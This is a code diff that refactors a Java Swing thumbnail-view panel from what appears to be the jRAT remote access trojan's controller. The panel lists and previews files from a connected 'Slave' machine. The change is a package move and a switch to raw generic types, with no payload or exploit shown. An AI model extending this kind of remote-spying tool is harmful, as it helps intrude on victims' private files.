@@ -1,10 +1,9 @@
-package jrat.controller.ui.panels;
+package jrat.module.fs.ui;
 
 import iconlib.IconUtils;
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.Packet85ThumbnailPreview;
-import jrat.controller.ui.renderers.ThumbsListRenderer;
 import jrat.controller.utils.Utils;
+import jrat.module.fs.packets.Packet85ThumbnailPreview;
 
 import javax.imageio.ImageIO;
 import javax.swing.*;
@@ -26,7 +25,7 @@ public class PanelThumbView extends JPanel {
 
 	private String[] files;
 	private Slave slave;
-	private JList<String> list;
+	private JList list;
 	private JLabel lblCount;
 	private JProgressBar progressBar;
 	private JPopupMenu popupMenu;
@@ -42,8 +41,8 @@ public class PanelThumbView extends JPanel {
 		return lblCount;
 	}
 
-	public DefaultListModel<String> getModel() {
-		return (DefaultListModel<String>) list.getModel();
+	public DefaultListModel getModel() {
+		return (DefaultListModel) list.getModel();
 	}
 
 	public PanelThumbView(Slave s) {
@@ -55,9 +54,9 @@ public class PanelThumbView extends JPanel {
 		progressBar = new JProgressBar();
 		lblCount = new JLabel("0/0");
 
-		list = new JList<String>();
+		list = new JList();
 		list.setCellRenderer(new ThumbsListRenderer(this));
-		list.setModel(new DefaultListModel<String>());
+		list.setModel(new DefaultListModel());
 		list.setLayoutOrientation(JList.VERTICAL_WRAP);
 		scrollPane.setViewportView(list);
 		
@@ -100,7 +99,7 @@ public class PanelThumbView extends JPanel {
 		mntmSaveSelectedx = new JMenuItem("Save selected (150x100)");
 		mntmSaveSelectedx.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				List<String> en = list.getSelectedValuesList();
+				List<String> en = (List<String>)list.getSelectedValuesList();
 
 				for (String str : en) {
 					JFileChooser c = new JFileChooser();
